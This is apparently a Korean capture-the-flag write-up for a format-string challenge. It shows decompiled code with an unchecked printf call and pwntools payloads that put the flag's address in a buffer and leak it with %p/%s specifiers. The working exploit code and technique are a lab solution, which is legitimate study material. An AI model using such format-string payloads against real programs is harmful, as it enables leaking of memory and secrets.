## 함수 분석 / 취약점 발견
문제 설명 그대로, binary에 실제 flag 값이 존재했다. 이를 출력할 수 있으면 참 좋을것 같다.
```
gdb-peda$ x/1s 0x601080
0x601080 <flag>:	"FLAG{_the_real_flag_will_be_here_}"
```
### IDA decompile analysis
```c++
  *((_BYTE *)&buf + (int)(read(0, &buf, 0x10uLL) - 1)) = 0;
  if ( (_BYTE)buf != 121 && (_BYTE)buf != 89 )
    return 0;
  src = (char *)malloc(0x84uLL);
  printf("Name: ");
  read(0, src, 0x80uLL);
  strcpy(usr, src);
  printf("Welcome ");
  printf(qword_601160, usr);
```
* buffer에 byte검사밖에 이루어지지 않으므로 buffer에 y에 이어 다양한 값을 입력할 수 있다.
* buffer에 flag의 주소를 입력한후, usr에 %s를 입력해서 %s format string이 flag의 주소를 가르키면 flag을 출력할 수 있을것이다.

## 구현
1. flag 주소 입력
* buffer에 정확히 16byte만큼 입력해줄 수 있어 주소를 입력하는데 제한이 없다
* y 뒤에 1을 7개 붙임으로써 format string attack시 4바이트 규격에 맞게 flag 주소가 전달되도록 하자
```python
p.recvuntil(': ')
payload = b'y1111111' + p32(0x601080)
p.sendline(payload)
p.recvuntil(': ')
```
2. format string 입력
* format string의 모든 곳에 %p를 걸어보고 그 뒤에 0x601080이 뜨는곳만 %s로 바꿔주면 flag가 출력된다.
```python
payload = b'a'*32 +b'%p  '*8 + b'%s  ' + b'%p  '*7 + b'a'*33

p.send(payload)
p.recvuntil('Welcome ')
log.info('recieved :')

log.info(p.recv())
```